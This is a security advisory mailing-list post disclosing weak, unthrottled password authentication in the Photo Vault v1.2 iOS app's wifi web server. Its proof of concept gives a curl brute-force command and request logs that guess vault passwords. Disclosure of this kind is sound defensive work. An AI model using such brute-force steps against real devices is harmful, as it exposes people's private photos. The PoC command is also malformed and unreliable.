
Date: Fri, 19 Jan 2018 21:47:56 +0100
From: Vulnerability Lab <admin@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Photo Vault v1.2 iOS - Insecure Authentication Vulnerability

Document Title:
===============
Photo Vault v1.2 iOS - Insecure Authentication Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2110


Release Date:
=============
2018-01-16


Vulnerability Laboratory ID (VL-ID):
====================================
2110


Common Vulnerability Scoring System:
====================================
4.8


Vulnerability Class:
====================
Insecure Storage of Sensitive Information


Current Estimated Price:
========================
1.000€ - 2.000€


Product & Service Introduction:
===============================
https://itunes.apple.com/us/app/id1053383947


Abstract Advisory Information:
==============================
The vulnerability labortory core research team discovered a insecure authentication issue in the official 


Vulnerability Disclosure Timeline:
==================================
2018-01-16: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
PhotoRange
Product: Photo Vault - Mobile (Web-Application) 1.2


Exploitation Technique:
=======================
Local


Severity Level:
===============
Medium


Technical Details & Description:
================================
An insecure configuration vulnerability has been discovered in the official iOS mobile Photo Vault v1.2 iOS web-application.

The vulnerability is located in the login mechanism and password request communication. In case of the activated wifi 
in the app it is possible to remotly access (http-server) the protected vault by a password. The password request is a 
simple less protected attempt to the login.html file with `_` to split between the password and file. There is no 
request limitation to block automated attacks. 

Attackers can perform fast enumerate the password by simply audits against the http basic authentication mechanism. 
Remote attackers can use an automated dictionary attack or compromise by manual basic http bruteforce attack via curl, 
nmap or http-brute. Attackers can fast gain unauthorized access the private vault over the activated wifi web-application 
in the same network. A second minor problem is that there is no https protocol activated for the wifi http-server 
communication in the network. Taken together, these two problems pose a significant risk to users and individuals,
based on sensitive information stored in the vault of the mobile iOS application.

The security risk of the insecure authentication configuration vulnerability is estimated as medium with a cvss count of 4.8. 
Exploitation of the vulnerability requires network access to connect to the web-server via wifi without user interaction. 
Successful exploitation of the vulnerability results in unauthorized access to private vault data or sensitive information.


Proof of Concept (PoC):
=======================
The security issue can be exploited by remote attackers without privileged user account or user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below.


PoC: 
http_code=$(curl -L -data password="passwdords.txt" "$url http://Localhost:9900/login.html__" -w '%{http_code}' -o /root/fuzztime -s) #forensic


--- PoC Session Logs [GET] ---
GET http://localhost:9900/login.html
Host: Localhost:9900
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://Localhost:9900/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Date: Sat, 06 Jan 2018 15:06:20 GMT
Accept-Ranges: bytes
Transfer-Encoding: chunked
Note: Requests first the login page
-
GET http://localhost:9900/login.html__passwd1
Host: Localhost:9900
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost:9900/login.html
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Date: Sat, 06 Jan 2018 15:06:26 GMT
Accept-Ranges: bytes
Transfer-Encoding: chunked

Note: Access to vault of ios mobile application was cracked in a forensic access test within 15 minutes.


Reference(s):
http://localhost:9900/
http://localhost:9900/login.html
http://localhost:9900/login.html__


Security Risk:
==============
The security risk of the vulnerability in the mobile vault application is eastimated as medium (CVSS 4.8).


Credits & Authors:
==================
Benjamin K.M. [bkm@...nerability-lab.com] - https://www.vulnerability-lab.com/show.php?user=Benjamin+K.M.


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
phone numbers, conversations or anything else to journalists, investigative authorities or private individuals. 

Domains:    www.vulnerability-lab.com		- www.vulnerability-db.com					- www.evolution-sec.com
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get an ask permission.

				    Copyright © 2018 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - ADMIN TEAM
SERVICE: www.vulnerability-lab.com

